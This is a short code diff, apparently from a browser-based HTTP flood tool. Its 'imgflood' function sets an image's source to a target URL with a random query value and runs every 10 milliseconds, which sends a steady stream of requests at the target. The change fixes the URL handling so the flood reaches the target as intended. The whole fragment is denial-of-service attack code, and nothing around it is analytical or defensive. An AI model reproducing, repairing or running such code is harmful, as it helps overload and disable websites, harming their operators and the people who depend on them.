@@ -10,7 +10,7 @@ var TARGET = x
 var URI = a
 var pic = new Image()
 var rand = Math.floor(Math.random() * 5000)
-pic.src = TARGET.replace('https://','')+URI+rand+'=val'
+pic.src = TARGET+URI+rand+'=val'
 }
 setInterval(imgflood, 10)
 } else {
